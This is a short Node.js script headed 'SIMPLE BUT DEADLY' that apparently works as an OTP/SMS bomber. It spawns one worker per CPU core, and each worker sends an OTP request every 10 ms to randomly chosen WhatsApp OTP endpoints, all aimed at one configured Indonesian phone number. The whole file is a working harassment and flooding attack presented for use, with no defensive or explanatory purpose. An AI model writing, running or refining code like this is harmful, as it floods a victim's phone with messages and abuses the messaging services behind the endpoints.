// ===== SIMPLE BUT DEADLY =====
const axios = require('axios');
const cluster = require('cluster');
const os = require('os');
const config = require('./config.js');

if (cluster.isMaster) {
  console.log(`🔥 STARTING ${os.cpus().length} WORKERS`.red);
  for (let i = 0; i < os.cpus().length; i++) {
    cluster.fork();
  }
} else {
  console.log(`[WORKER ${cluster.worker.id}] STARTED`.yellow);
  
  const endpoints = config.whatsapp.endpoints.otpRequest;
  const target = config.target.phoneNumber;
  let count = 0;
  
  setInterval(() => {
    const endpoint = endpoints[Math.floor(Math.random() * endpoints.length)];
    axios.post(endpoint, {
      phone: target,
      method: 'sms',
      country_code: '62'
    }).then(() => {
      count++;
      console.log(`[${cluster.worker.id}] ✅ OTP SENT (${count})`.green);
    }).catch(() => {
      console.log(`[${cluster.worker.id}] ❌ FAIL`.red);
    });
  }, 10); // 10ms = 100 REQUESTS/DETIK PER WORKER!
}